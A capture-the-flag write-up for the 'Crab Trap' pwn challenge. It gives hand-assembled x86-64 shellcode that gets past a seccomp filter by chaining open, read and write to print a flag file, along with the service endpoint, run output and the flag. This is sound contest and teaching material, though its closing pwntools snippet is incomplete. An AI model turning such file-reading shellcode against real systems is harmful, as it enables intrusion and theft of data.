# Crab Trap

> **Category**: Pwn
>
> **Flag**: `bronco{h0w_c4n_mr_kr4b5_c0de}`

> Mr. Krabs has heard about these so-called "shellcode hackers" trying to break into his secret vault. So he hired the barnacles.
>
> They said no execve. Something about a "Strict Sea Policy."
>
> You'll need to get creative if you want that flag.
>
> `nc 0.cloud.chals.io 34381`
>
> The flag can be found at: `/home/ctf/flag.txt`. No source is intentional.

### Files

* `exploit.py` — full solve script (connects, sends shellcode, prints the flag)

No binary/source was provided for this one ("No source is intentional") — the banner itself told us everything we needed.

### Tools

* Python 3 + raw `socket` (no pwntools `remote()`/`asm()` needed — see note below)
* A calculator and a Linux `syscall(2)` table (or `man 2 syscalls` / `/usr/include/asm/unistd_64.h`)

> **Note on environment:** this box didn't have `as`/binutils installed, so `pwntools.asm()` (which shells out to a real assembler) wasn't available. The shellcode in `exploit.py` is therefore **hand-assembled byte by byte** — every instruction has its raw opcode bytes written out in a comment next to it. If you do have an assembler, the equivalent pwntools one-liner is at the bottom of this writeup.

### Recon

Connecting and reading the banner tells you the entire rule set up front:

```
$ nc 0.cloud.chals.io 34381

   /\_/\   /\_/\
 =( ^.^ )=( ^.^ )=
  | (") |  | (") |
   \___/    \___/
  ~~ THE CRAB TRAP ~~

 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Welcome to Mr. Krabs' Shellcode Emporium!
  "I like money... and restricted syscalls."

  *** STRICT SEA POLICY IN EFFECT ***
  Allowed syscalls: open, read, write
  execve?  The barnacles will DESTROY you.
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


[*] Drop your crab feed into the trap (max 512 bytes):
>
```

Reading between the lines:

* It's a **shellcode challenge** — whatever you send after the prompt gets executed directly (max 512 bytes).
* A **seccomp filter** ("Strict Sea Policy") allows only `open`, `read`, `write` — every other syscall, `execve` explicitly named, gets you killed.
* The flag lives at a **known, fixed path**: `/home/ctf/flag.txt`.

This is the textbook "seccomp blocks execve → read the flag file directly with open/read/write" pattern. No `system()`/shell needed or possible — we just replicate `cat /home/ctf/flag.txt` using only the three permitted syscalls.

### Exploit plan

```
fd = open("/home/ctf/flag.txt", O_RDONLY, 0)   ; syscall number 2
n  = read(fd, buf, 0x100)                       ; syscall number 0
     write(1, buf, n)                           ; syscall number 1
```

Constraints to respect while hand-assembling:

* **No `execve`.** Not just disallowed by seccomp — the barnacles (server-side monitor) will kill the connection if it's even attempted.
* **Payload ≤ 512 bytes.** Our final shellcode comes in at 81 bytes, comfortably under.
* **Need the path string somewhere in memory.** Since we can't rely on `.data`/`.rodata` (this is raw shellcode, no ELF sections), we push `"/home/ctf/flag.txt\0"` onto the **stack** ourselves, 8 bytes (one qword) at a time via `mov rax, <imm64>; push rax`, then point `rdi` at `rsp`.

#### Building the shellcode

```python
def mov_rax_imm64(q: int) -> bytes:
    return b"\x48\xb8" + struct.pack("<Q", q)

path = b"/home/ctf/flag.txt\x00"
while len(path) % 8:
    path += b"\x00"                      # pad to a whole number of qwords
qwords = [struct.unpack("<Q", path[i:i+8])[0] for i in range(0, len(path), 8)]

sc  = b"\x31\xc0"                        # xor eax, eax
sc += b"\x50"                            # push rax          ; null terminator
for q in reversed(qwords):               # push qwords in reverse so the string
    sc += mov_rax_imm64(q) + b"\x50"     #   reads forward once it's on the stack

sc += b"\x48\x89\xe7"                    # mov rdi, rsp       ; rdi = &"/home/ctf/flag.txt"
sc += b"\x31\xf6"                        # xor esi, esi       ; O_RDONLY
sc += b"\x31\xd2"                        # xor edx, edx       ; mode = 0
sc += b"\xb8\x02\x00\x00\x00"            # mov eax, 2         ; sys_open
sc += b"\x0f\x05"                        # syscall

sc += b"\x89\xc7"                        # mov edi, eax       ; fd = open()'s return value
sc += b"\x48\x89\xe6"                    # mov rsi, rsp       ; reuse the stack as read buffer
sc += b"\xba\x00\x01\x00\x00"            # mov edx, 0x100     ; count
sc += b"\x31\xc0"                        # xor eax, eax       ; sys_read
sc += b"\x0f\x05"                        # syscall

sc += b"\x89\xc2"                        # mov edx, eax       ; n = bytes actually read
sc += b"\xbf\x01\x00\x00\x00"            # mov edi, 1         ; fd = stdout
sc += b"\x48\x89\xe6"                    # mov rsi, rsp       ; buf
sc += b"\xb8\x01\x00\x00\x00"            # mov eax, 1         ; sys_write
sc += b"\x0f\x05"                        # syscall
```

81 bytes total, well under the 512-byte cap, and it uses **only** `open`/`read`/`write` — no `execve`, nothing the barnacles will flag.

### Running the exploit

```
$ python exploit.py
[*] shellcode length: 81 bytes (limit is 512)

   /\_/\   /\_/\
 =( ^.^ )=( ^.^ )=
   ...
[*] Drop your crab feed into the trap (max 512 bytes):
>
[*] Nom nom... swallowed 82 bytes. Deploying the Barnacle Barrier...
[*] The trap is set. Good luck, sailor.

bronco{h0w_c4n_mr_kr4b5_c0de}
```

(82 bytes = 81 shellcode bytes + the trailing `\n` we send as a delimiter — the server happily executes it as a no-op-adjacent byte at the tail, since it never gets reached.)

### Flag

```
bronco{h0w_c4n_mr_kr4b5_c0de}
```

### If you do have an assembler (pwntools shortcut)

For reference, the same shellcode with `binutils` installed is much shorter to write:

```python
from pwn import asm, context
context.arch = "amd64"
sc = asm('''
    xor eax, eax
    push rax
    mov rax, 0x0067616c662f6674            /* "flag.tf" chunked differently, adjust as needed */
    push rax
    ...
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov eax, 2                              /* open */
    syscall
    mov edi, eax
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax                            /* read */
    syscall
    mov edx, eax
    mov edi, 1
    mov rsi, rsp
    mov eax, 1                              /* write */
    syscall
''')
```

Either approach produces functionally the same 3-syscall open→read→write chain.
